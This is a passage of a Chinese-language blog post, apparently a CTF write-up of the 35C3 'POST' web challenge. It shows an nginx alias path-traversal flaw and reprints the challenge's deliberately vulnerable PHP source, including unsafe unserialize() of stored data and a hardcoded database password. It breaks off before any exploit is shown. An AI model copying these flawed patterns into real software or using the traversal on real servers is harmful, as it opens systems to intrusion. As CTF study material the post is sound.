@@ -1,0 +1,1136 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=6.0.1" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=6.0.1">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=6.0.1">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=6.0.1">
+
+
+
+
+
+
+  <meta name="keywords" content="嘤嘤嘤">
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="从零开始的学习生涯" type="application/atom+xml">
+
+
+
+
+
+
+<meta name="description" content="35C3-POST扫描目录得到uploads目录，测试目录穿越成功，得到nginx备份文件和源码 12345678910111213141516171819202122232425262728293031323334353637383940414243444546server &amp;#123;	listen 80;    access_log  /var/log/nginx/example.log;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="35C3-POST">
+<meta property="og:url" content="http://yoursite.com/2019/04/19/2019-4-19-35C3-POST/index.html">
+<meta property="og:site_name" content="从零开始的学习生涯">
+<meta property="og:description" content="35C3-POST扫描目录得到uploads目录，测试目录穿越成功，得到nginx备份文件和源码 12345678910111213141516171819202122232425262728293031323334353637383940414243444546server &amp;#123;	listen 80;    access_log  /var/log/nginx/example.log;">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:updated_time" content="2019-12-05T13:17:01.252Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="35C3-POST">
+<meta name="twitter:description" content="35C3-POST扫描目录得到uploads目录，测试目录穿越成功，得到nginx备份文件和源码 12345678910111213141516171819202122232425262728293031323334353637383940414243444546server &amp;#123;	listen 80;    access_log  /var/log/nginx/example.log;">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '6.0.1',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":true,"scrollpercent":true,"onmobile":false},
+    fancybox: false,
+    tabs: true,
+    motion: {"enable":true,"async":true,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: 'undefined',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":5},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2019/04/19/2019-4-19-35C3-POST/">
+
+
+
+
+
+  <title>35C3-POST | 从零开始的学习生涯</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope="" itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">从零开始的学习生涯</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">FDrag0n的学习生涯</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories" rel="section">
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+            关于
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off" placeholder="搜索..." spellcheck="false" type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/04/19/2019-4-19-35C3-POST/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="FDrag0n">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="从零开始的学习生涯">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">35C3-POST</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-04-19T10:47:49+08:00">
+                2019-04-19
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="page-pv"><i class="fa fa-file-o"></i>
+            <span class="busuanzi-value" id="busuanzi_value_page_pv"></span>
+            </span>
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="35C3-POST"><a href="#35C3-POST" class="headerlink" title="35C3-POST"></a>35C3-POST</h1><p>扫描目录得到uploads目录，测试目录穿越成功，得到nginx备份文件和源码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">	listen 80;</span><br><span class="line">    access_log  /var/log/nginx/example.log;</span><br><span class="line"></span><br><span class="line">    server_name localhost;</span><br><span class="line"></span><br><span class="line">    root /var/www/html;</span><br><span class="line"></span><br><span class="line">    location /uploads &#123;</span><br><span class="line">        autoindex on;</span><br><span class="line">        alias /var/www/uploads/;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    location / &#123;</span><br><span class="line">        alias /var/www/html/;</span><br><span class="line">        index index.php;</span><br><span class="line"></span><br><span class="line">        location ~ \.php$ &#123;</span><br><span class="line">            include snippets/fastcgi-php.conf;</span><br><span class="line">            fastcgi_pass unix:/run/php/php7.2-fpm.sock;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    location /inc/ &#123;</span><br><span class="line">        deny all;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">server &#123;</span><br><span class="line">    listen 127.0.0.1:8080;</span><br><span class="line">    access_log /var/log/nginx/proxy.log;</span><br><span class="line"></span><br><span class="line">    if ( $request_method !~ ^(GET)$ ) &#123;</span><br><span class="line">        return 405;</span><br><span class="line">    &#125;</span><br><span class="line">    root /var/www/miniProxy;</span><br><span class="line">    location / &#123;</span><br><span class="line">        index index.php;</span><br><span class="line"></span><br><span class="line">        location ~ \.php$ &#123;</span><br><span class="line">            include snippets/fastcgi-php.conf;</span><br><span class="line">            fastcgi_pass unix:/run/php/php7.2-fpm.sock;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>由于 url 没加后缀 /，而 alias 设置了有后缀 / 配置，导致可以利用 ../ 绕过限制访问目录。</p>
+<p>db.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DB</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> $con;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> $init = <span class="keyword">false</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">initialize</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        DB::$con = sqlsrv_connect(<span class="string">"db"</span>, <span class="keyword">array</span>(<span class="string">"pwd"</span>=&gt; <span class="string">"Foobar1!"</span>, <span class="string">"uid"</span>=&gt;<span class="string">"challenger"</span>, <span class="string">"Database"</span>=&gt;<span class="string">"challenge"</span>));</span><br><span class="line">        <span class="keyword">if</span> (!DB::$con) DB::error();</span><br><span class="line">        DB::$init = <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">error</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"db error"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">prepare_params</span><span class="params">($params)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> array_map(<span class="function"><span class="keyword">function</span><span class="params">($x)</span></span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (is_object($x) <span class="keyword">or</span> is_array($x)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="string">'$serializedobject$'</span> . serialize($x);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (preg_match(<span class="string">'/^\$serializedobject\$/i'</span>, $x)) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">"invalid data"</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="string">""</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> $x;</span><br><span class="line">        &#125;, $params);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">retrieve_values</span><span class="params">($res)</span> </span>&#123;</span><br><span class="line">        $result = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">while</span> ($row = sqlsrv_fetch_array($res)) &#123;</span><br><span class="line">            $result[] = array_map(<span class="function"><span class="keyword">function</span><span class="params">($x)</span></span>&#123;</span><br><span class="line">                <span class="keyword">return</span> preg_match(<span class="string">'/^\$serializedobject\$/i'</span>, $x) ?</span><br><span class="line">                    unserialize(substr($x, <span class="number">18</span>)) : $x;</span><br><span class="line">            &#125;, $row);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $result;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">query</span><span class="params">($sql, $values=array<span class="params">()</span>)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!is_array($values)) $values = <span class="keyword">array</span>($values);</span><br><span class="line">        <span class="keyword">if</span> (!DB::$init) DB::initialize();</span><br><span class="line">        $res = sqlsrv_query(DB::$con, $sql, $values);</span><br><span class="line">        <span class="keyword">if</span> ($res === <span class="keyword">false</span>) DB::error();</span><br><span class="line">        <span class="keyword">return</span> DB::retrieve_values($res);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">insert</span><span class="params">($sql, $values=array<span class="params">()</span>)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!is_array($values)) $values = <span class="keyword">array</span>($values);</span><br><span class="line">        <span class="keyword">if</span> (!DB::$init) DB::initialize();</span><br><span class="line">        $values = DB::prepare_params($values);</span><br><span class="line">        $x = sqlsrv_query(DB::$con, $sql, $values);</span><br><span class="line">        <span class="keyword">if</span> (!$x) <span class="keyword">throw</span> <span class="keyword">new</span> <span class="keyword">Exception</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>default.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">include</span> <span class="string">'inc/post.php'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">"title"</span>])) &#123;</span><br><span class="line">        $attachments = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>($_FILES[<span class="string">"attach"</span>]) &amp;&amp; is_array($_FILES[<span class="string">"attach"</span>])) &#123;</span><br><span class="line">            $folder = sha1(random_bytes(<span class="number">10</span>));</span><br><span class="line">            mkdir(<span class="string">"../uploads/$folder"</span>);</span><br><span class="line">            <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; count($_FILES[<span class="string">"attach"</span>][<span class="string">"tmp_name"</span>]); $i++) &#123;</span><br><span class="line">                <span class="keyword">if</span> ($_FILES[<span class="string">"attach"</span>][<span class="string">"error"</span>][$i] !== <span class="number">0</span>) <span class="keyword">continue</span>;</span><br><span class="line">                $name = basename($_FILES[<span class="string">"attach"</span>][<span class="string">"name"</span>][$i]);</span><br><span class="line">                move_uploaded_file($_FILES[<span class="string">"attach"</span>][<span class="string">"tmp_name"</span>][$i], <span class="string">"../uploads/$folder/$name"</span>);</span><br><span class="line">                $attachments[] = <span class="keyword">new</span> Attachment(<span class="string">"/uploads/$folder/$name"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        $post = <span class="keyword">new</span> Post($_POST[<span class="string">"title"</span>], $_POST[<span class="string">"content"</span>], $attachments);</span><br><span class="line">        $post-&gt;save();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">"action"</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span> ($_GET[<span class="string">"action"</span>] == <span class="string">"restart"</span>) &#123;</span><br><span class="line">            Post::truncate();</span><br><span class="line">            header(<span class="string">"Location: /"</span>);</span><br><span class="line">            <span class="keyword">die</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;h2&gt;Create <span class="keyword">new</span> post&lt;/h2&gt;</span><br><span class="line">&lt;form method=<span class="string">"POST"</span> enctype=<span class="string">"multipart/form-data"</span>&gt;</span><br><span class="line">&lt;table&gt;</span><br><span class="line">&lt;tr&gt;</span><br><span class="line">&lt;td&gt;</span><br><span class="line">&lt;label <span class="keyword">for</span>=<span class="string">"title"</span>&gt;Title&lt;/label&gt;</span><br><span class="line">&lt;/td&gt; &lt;td&gt;</span><br><span class="line">&lt;input name=<span class="string">"title"</span>&gt;</span><br><span class="line">&lt;/td&gt;</span><br><span class="line">&lt;/tr&gt;</span><br><span class="line">&lt;tr&gt;</span><br><span class="line">&lt;td&gt;</span><br><span class="line">&lt;label <span class="keyword">for</span>=<span class="string">"content"</span>&gt;Content&lt;/label&gt;</span><br><span class="line">&lt;/td&gt; &lt;td&gt;</span><br><span class="line">&lt;input name=<span class="string">"content"</span>&gt;</span><br><span class="line">&lt;/td&gt;</span><br><span class="line">&lt;/tr&gt;</span><br><span class="line">&lt;tr&gt;</span><br><span class="line">&lt;td&gt;</span><br><span class="line">&lt;label <span class="keyword">for</span>=<span class="string">"attach"</span>&gt;Attachments&lt;/label&gt;</span><br><span class="line">&lt;/td&gt; &lt;td&gt;</span><br><span class="line">&lt;input name=<span class="string">"attach[]"</span> type=<span class="string">"file"</span>&gt;</span><br><span class="line">&lt;/td&gt;</span><br><span class="line">&lt;/tr&gt;</span><br><span class="line">&lt;tr&gt;</span><br><span class="line">&lt;td&gt;</span><br><span class="line">&lt;/td&gt; &lt;td&gt;</span><br><span class="line">&lt;input name=<span class="string">"attach[]"</span> type=<span class="string">"file"</span>&gt;</span><br><span class="line">&lt;/td&gt;</span><br><span class="line">&lt;/tr&gt;</span><br><span class="line">&lt;tr&gt;</span><br><span class="line">&lt;td&gt;</span><br><span class="line">&lt;/td&gt; &lt;td&gt;</span><br><span class="line">&lt;input name=<span class="string">"attach[]"</span> type=<span class="string">"file"</span>&gt;</span><br><span class="line">&lt;/td&gt;</span><br><span class="line">&lt;/tr&gt;</span><br><span class="line">&lt;tr&gt;&lt;td&gt;&lt;/td&gt;&lt;td&gt;</span><br><span class="line">&lt;input type=<span class="string">"submit"</span>&gt;</span><br><span class="line">&lt;/td&gt;&lt;/tr&gt;</span><br><span class="line">&lt;/table&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $posts = Post::loadall();</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>($posts)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;b&gt;You do not have any posts. Create &lt;a href=\"/?action=create\"&gt;some&lt;/a&gt;!&lt;/b&gt;"</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;b&gt;You have "</span> . count($posts) .<span class="string">" posts. Create &lt;a href=\"/?action=create\"&gt;some&lt;/a&gt; more if you want! Or &lt;a href=\"/?action=restart\"&gt;restart your blog&lt;/a&gt;.&lt;/b&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">foreach</span>($posts <span class="keyword">as</span> $p) &#123;</span><br><span class="line">        <span class="keyword">echo</span> $p;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;br&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>post.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Attachment</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $url = <span class="keyword">NULL</span>;</span><br><span class="line">    <span class="keyword">private</span> $za = <span class="keyword">NULL</span>;</span><br><span class="line">    <span class="keyword">private</span> $mime = <span class="keyword">NULL</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($url)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;url = $url;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mime = (<span class="keyword">new</span> finfo)-&gt;file(<span class="string">"../"</span>.$url);</span><br><span class="line">        <span class="keyword">if</span> (substr(<span class="keyword">$this</span>-&gt;mime, <span class="number">0</span>, <span class="number">11</span>) == <span class="string">"Zip archive"</span>) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;mime = <span class="string">"Zip archive"</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;za = <span class="keyword">new</span> ZipArchive;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $str = <span class="string">"&lt;a href='&#123;$this-&gt;url&#125;'&gt;"</span>.basename(<span class="keyword">$this</span>-&gt;url).<span class="string">"&lt;/a&gt; ($this-&gt;mime "</span>;</span><br><span class="line">        <span class="keyword">if</span> (!is_null(<span class="keyword">$this</span>-&gt;za)) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;za-&gt;open(<span class="string">"../"</span>.<span class="keyword">$this</span>-&gt;url);</span><br><span class="line">            $str .= <span class="string">"with "</span>.<span class="keyword">$this</span>-&gt;za-&gt;numFiles . <span class="string">" Files."</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $str. <span class="string">")"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Post</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $title = <span class="keyword">NULL</span>;</span><br><span class="line">    <span class="keyword">private</span> $content = <span class="keyword">NULL</span>;</span><br><span class="line">    <span class="keyword">private</span> $attachment = <span class="keyword">NULL</span>;</span><br><span class="line">    <span class="keyword">private</span> $ref = <span class="keyword">NULL</span>;</span><br><span class="line">    <span class="keyword">private</span> $id = <span class="keyword">NULL</span>;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($title, $content, $attachments=<span class="string">""</span>)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;title = $title;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;content = $content;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;attachment = $attachments;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">save</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> $USER;</span><br><span class="line">        <span class="keyword">if</span> (is_null(<span class="keyword">$this</span>-&gt;id)) &#123;</span><br><span class="line">            DB::insert(<span class="string">"INSERT INTO posts (userid, title, content, attachment) VALUES (?,?,?,?)"</span>, </span><br><span class="line">                <span class="keyword">array</span>($USER-&gt;uid, <span class="keyword">$this</span>-&gt;title, <span class="keyword">$this</span>-&gt;content, <span class="keyword">$this</span>-&gt;attachment));</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            DB::query(<span class="string">"UPDATE posts SET title = ?, content = ?, attachment = ? WHERE userid = ? AND id = ?"</span>,</span><br><span class="line">                <span class="keyword">array</span>(<span class="keyword">$this</span>-&gt;title, <span class="keyword">$this</span>-&gt;content, <span class="keyword">$this</span>-&gt;attachment, $USER-&gt;uid, <span class="keyword">$this</span>-&gt;id));</span><br><span class="line">        &#125;</span><br><span class="line">    